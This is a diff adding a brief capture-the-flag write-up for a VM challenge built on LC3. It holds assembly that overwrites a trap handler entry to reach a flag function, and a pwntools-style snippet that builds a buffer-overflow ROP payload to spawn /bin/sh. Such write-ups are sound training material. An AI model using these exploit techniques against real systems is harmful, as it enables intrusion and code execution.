@@ -1,0 +1,37 @@
+This week timmy is back at it again with another vm based on lc3.
+THe first flag is pretty simple. The trap handers are an array of functions we can modify ourselves, so just overwrite one with the address of the flag function and profit.
+
+        .ORIG x1000
+
+        ; R0 ← 4 * TRAP_HALT (37)
+        LD   R0, TP_HALTVEC    ; R0 = 37
+        ADD  R0, R0, R0        ; R0 = 2*37 = 74
+        ADD  R0, R0, R0        ; R0 = 4*37 = 148
+
+        ; R1 ← low‑half of &trap_sendfile_deprecated = 0x2343
+        LD   R1, NEW_LOW16
+
+        ; MEM[148] ← 0x2343
+        STR  R1, R0, #0
+
+        ; now divert HALT → trap_sendfile_deprecated
+        TRAP x25
+
+        ; fallback
+        HALT
+
+TP_HALTVEC   .FILL #37          ; 0x25 in decimal
+NEW_LOW16    .FILL x2343        ; low 16 bits of 0x402343
+        .END
+
+The second is a bit harder. Have the trap funcall call a different function that takes in user input and buffer overflow into a rop chain that gives us a shell.
+
+    rop(rax=0x3b, rdi=cmd_addr+1, rsi=0, rdx=0, r10=0)
+    # append the syscall; ret gadget
+    rop.raw(rop.find_gadget(['syscall','ret'])[0])
+
+    # — compose stage2: [padding] + ["/bin/sh\x00"] + [ROP chain]
+    payload2 = b'A'*pad_len + cmd + rop.chain()+b'A'*0x1000
+
+    # — send stage2 and get a shell
+    io.send(payload2)
